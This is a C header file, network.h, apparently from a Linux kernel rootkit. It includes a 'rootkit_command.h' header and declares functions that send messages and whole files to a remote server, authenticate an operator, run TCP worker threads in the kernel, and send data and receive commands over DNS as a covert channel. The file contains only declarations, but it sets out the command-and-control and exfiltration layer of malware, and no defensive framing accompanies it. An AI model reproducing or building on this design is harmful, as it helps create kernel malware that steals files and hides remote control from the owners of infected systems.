#ifndef NETWORK_H
#define NETWORK_H

#include <linux/delay.h>
#include <linux/errno.h>
#include <linux/fcntl.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/socket.h>
#include <linux/uio.h>

#include "config.h"
#include "crypto.h"
#include "rootkit_command.h"

// network.c
int send_to_server_raw(const char *data, size_t len); 	        // Send a message to the server
int send_to_server(char *message, ...);					        // Send a formatted message to the server
int receive_from_server(char *buffer, size_t len);		        // Receive a message from the server
int send_file_to_server(char *filename); 				        // Send a file to the server

// protocols/tcp/socket.c
struct socket *get_worker_socket(void);                         // Get the worker socket
struct socket *set_worker_socket(struct socket *s);             // Set the worker socket
int close_worker_socket(void);                                  // Close the worker socket
int connect_worker_socket_to_server(struct sockaddr_in *addr);  // Connect the worker socket to the server

// protocols/tcp/worker.c
bool is_user_auth(void);							        	// Check if the user is authenticated
int set_user_auth(bool auth);							        // Set the user authentication status
int start_network_worker(void);							        // Start the network worker thread
int stop_network_worker(void);						        	// Stop the network worker thread

// protocols/dns/dns.c
extern bool response_over_dns;                                  // Flag to indicate if response is over DNS 
int dns_send_data(const char *data, size_t len);                // Send data over DNS
int dns_receive_command(char *buffer, size_t max_len);          // Receive command over DNS

// protocols/dns/worker.c
int start_dns_worker(void);                                     // Start the DNS worker thread
int stop_dns_worker(void);                                      // Stop the DNS worker thread

#endif /* NETWORK_H */